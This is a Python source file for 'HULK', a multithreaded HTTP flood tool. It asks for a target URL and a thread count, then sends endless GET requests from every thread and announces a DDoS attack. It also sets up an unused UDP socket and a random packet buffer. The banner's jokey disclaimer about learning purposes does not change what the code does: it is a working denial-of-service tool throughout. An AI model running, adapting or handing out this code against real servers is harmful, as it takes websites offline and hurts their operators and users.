#Lets import modules
import sys
import os
import time
import socket
import requests
import scapy.all as scapy
import random
import threading
from django.core.validators import URLValidator
from django.core.exceptions import ValidationError

validate = URLValidator()

#Lets start coding
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#Lets define sock and bytes
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
#Banner :
print('''
    ************************************************
    *            _  _ _   _ _    _  __             *
    *           | || | | | | |  | |/ /             * 
    *           | __ | |_| | |__| ' <              *
    *           |_||_|\___/|____|_|\_\             *
    *                                              *
    *          HTTP Unbearable Load King           *
    *          Author: Sumalya Chatterjee          *
    *                                              *
    ************************************************
    ************************************************
    *                                              *    
    *  [!] Disclaimer :                            *
    *  1. Don't Use For Personal Revenges          *
    *  2. Author Is Not Responsible For Your Jobs  *
    *  3. Use for learning purposes                * 
    *  4. Does HULK suit in villain role, huh?     *
    ************************************************
	''')
# Nhập URL và số luồng
url = input(" [+] Give HULK A Target URL (http://...): ")
try:
    validate(url)
    print(" ✅ Valid URL Checked.... ")
    print(" [+] Attack Screen Loading ....")
except ValidationError as exception:
    print(" ✘ Input a right url")
    exit()

try:
    num_threads = int(input(" [+] Number of threads: "))
except Exception:
    num_threads = 10
    print(" [!] Invalid input, using 10 threads.")

def attack():
    sent = 0
    while True:
        try:
            response = requests.get(url)
            sent += 1
            print(f"\n [+] Successfully sent {sent} HTTP GET request to {url} - Status: {response.status_code}")
        except Exception as e:
            print(f" [-] Error sending request: {e}")

print(" ")
print("    That's my secret Cap, I am always angry ")
print(" " )
print(" [+] HULK is attacking server " + url )
print (" " )
time.sleep(3)

threads = []
try:
    for i in range(num_threads):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
        threads.append(t)
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print(" ")
    print("\n [-] Ctrl+C Detected.........Exiting")
    print(" [-] DDOS ATTACK STOPPED")
input(" Enter To Exit")
os.system("clear")
print(" [-] Dr. Banner is tired...")
